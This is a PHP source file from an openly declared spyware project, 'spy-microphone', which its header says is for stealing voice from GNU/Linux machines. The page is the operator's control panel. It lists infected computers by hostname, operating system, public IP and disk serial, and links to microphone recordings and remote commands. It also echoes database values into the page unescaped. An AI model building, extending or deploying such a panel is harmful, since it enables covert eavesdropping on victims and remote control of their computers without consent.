<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }

?>



﻿<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
      <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title> Spy microphone Controller </title>

    <link rel="Shortcut Icon" type="image/ico" href="favicon.ico">


	<!-- BOOTSTRAP STYLES-->
    <link href="assets/css/bootstrap.css" rel="stylesheet" />
     <!-- FONTAWESOME STYLES-->
    <link href="assets/css/font-awesome.css" rel="stylesheet" />
        <!-- CUSTOM STYLES-->
    <link href="assets/css/custom.css" rel="stylesheet" />
     <!-- GOOGLE FONTS-->
   <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />
</head>
<body>
    <div id="wrapper">
        <nav class="navbar navbar-default navbar-cls-top " role="navigation" style="margin-bottom: 0">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="fa fa-bar"></span>
                    <span class="fa fa-bar"></span>
                    <span class="fa fa-bar"></span>
                </button>
                <a class="navbar-brand" href="dashboard.php"> Spymic </a>  
            </div>

           <div style="color: white; padding: 15px 50px 5px 50px;float: right; font-size: 16px;"> 
             <?php echo date("d-m-Y H:i"); ?> &nbsp; 
             <a href="logout.php" class="btn btn-danger square-btn-adjust">
              Logout <i class="fa fa-sign-out"></i>
             </a>  
           </div>

        </nav>   
           <!-- /. NAV TOP  -->
                <nav class="navbar-default navbar-side" role="navigation">
            <div class="sidebar-collapse">
                <ul class="nav" id="main-menu">
				<li class="text-center">
                    <img src="assets/img/find_user.png" class="user-image img-responsive"/>
					</li>
				
					
                <li>
                 <a href="dashboard.php"><i class="fa fa-dashboard fa-3x"></i> Dashboard </a>
               </li>


           <li>
              <a class="active-menu"  href="ui_elements.php">
              <i class="fa fa-desktop fa-3x"></i> UI Elements</a>
           </li>

                   
      <li>
         <a  href="records_microphone.php"><i class="fa fa-microphone fa-3x"></i> Records Microphone</a>
      </li>
                   			
			                   
                    <li>
          <a href="#"><i class="fa fa-sitemap fa-3x"></i> Multi Tasking <span class="fa arrow"></span></a>
                        <ul class="nav nav-second-level">
                            <li>
                                <a href="#">Second Level Link</a>
                            </li>
                            <li>
                                <a href="#">Second Level Link</a>
                            </li>
                            <li>
                                <a href="#">Second Level Link<span class="fa arrow"></span></a>
                                <ul class="nav nav-third-level">
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>

                                </ul>
                               
                            </li>
                        </ul>
                      </li>  

                  <li>
              <a  href="remote_commands.php"><i class="fa fa-terminal fa-3x"></i> Remote Commands </a>
                    </li>	

                    <li>
                        <a  href="settings.php"><i class="fa fa-cogs fa-3x"></i> Settings </a>
                    </li>

                </ul>
               
            </div>
            
        </nav>  
        <!-- /. NAV SIDE  -->

        <div id="page-wrapper" >
            <div id="page-inner">
                <div class="row">
                    <div class="col-md-12">

                       
                    </div>
                </div>


                   <?php

            unset($_SESSION["hard_disk_id"]);

           require_once('__ROOT__/connect.php');

            if (class_exists('DATABASE_CONNECT'))
            {
 
             $obj_conn  = new DATABASE_CONNECT;
            
             $host = $obj_conn->connect[0];
             $user = $obj_conn->connect[1];
             $pass = $obj_conn->connect[2];
             $db   = $obj_conn->connect[3];
 
            $conn = new mysqli($host,$user,$pass,$db);
 
             if ($conn->connect_error)
                   {
                    die ("Cannot connect " .$conn->connect_error);
                    }

           else
             {

              $sql = "select computer_name, operating_system, public_ip, hard_disk_id_serial_number
                      from records group by hard_disk_id_serial_number 
                      order by instant desc";
              $result = $conn->query($sql);
              $count = $result->num_rows;

   
                   echo "
  <div class='container-fluid'>
    <div class='panel panel-info'>
      <div class='panel-heading'>
        <div class='row'>
          <div class='col-xs-12 col-sm-12 col-md-8'>
            <h2 class='text-center pull-left' style='padding-left: 30px;'>  
            <i class='fa fa-info-circle'> </i> Computer Information Analytics </h2> </h2>
          </div>
          <div class='col-xs-9 col-sm-9 col-md-9'>
            <div class='col-xs-12 col-sm-12 col-md-12'>
              <div class='col-xs-12 col-md-4'>             
              </div>
            </div>
          </div>
        </div>
      </div> 

      <div class='panel-body table-responsive'>
        <table class='table table-hover'>
          <thead>
            <tr>
              <th class='text-center'> Device <i class='fa fa-desktop'> </i></th>
              <th class='text-center'> Hostname <i class='fa fa-desktop'> </th>
              <th class='text-center'> 
                 Operating System 
                 <i class='fa fa-windows'> </i>
                 <i class='fa fa-apple'> </i>
                 <i class='fa fa-linux'> </i>
               </th>
               <th class='text-center'> Public Ip <i class='fa fa-signal'> </i> </th>
              <th class='text-center'> View informations <i class='fa fa-info'> </i> </th>
            </tr>
          </thead>

         <tbody>
            <tr class='edit' id='detail'>";


    if ($count > 0)
       {
     while($row = $result->fetch_assoc()) 
          {

       $os_system = $row['operating_system'];
       $operating_system = strtok($os_system, '#');

       $serial_number = $row['hard_disk_id_serial_number'];


      echo "  <td class='text-center'> <i class='fa fa-desktop fa-3x'> </i> </td>
              <td class='text-center'> {$row['computer_name']} </td>
              <td class='text-center'> $operating_system </td>
              <td class='text-center'> {$row['public_ip']} </td>
               <td class='text-center'>
                <a class='btn btn-md btn-danger view'
                  href='info.php?serial_number={$serial_number}' target='_blank'>
                <i class='fa fa-eye' aria-hidden='true'> View Info </i>
              </a>
              </td>           
            </tr>
          ";
                 

      } // end of while rows

    } // end of if count    

    
    
      echo" </tbody>
        </table>
      </div>

   <div class='panel-footer'>
        <div class='row'>
         
        </div>
      </div>
    </div>
  </div>
  <div id=''>";




                
               
                   } // end of else connect


                } // ende of exists connect
           
           ?>

        </div>
               
    </div>




                 <!-- /. ROW  -->
                 <hr />
                 
                     </div>
                </div>
                <!-- /. ROW  -->
    </div>
             <!-- /. PAGE INNER  -->
            </div>
         <!-- /. PAGE WRAPPER  -->
        </div>
     <!-- /. WRAPPER  -->
    <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
    <!-- JQUERY SCRIPTS -->
    <script src="assets/js/jquery-1.10.2.js"></script>
      <!-- BOOTSTRAP SCRIPTS -->
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- METISMENU SCRIPTS -->
    <script src="assets/js/jquery.metisMenu.js"></script>
      <!-- CUSTOM SCRIPTS -->
    <script src="assets/js/custom.js"></script>
 
</body>
</html>
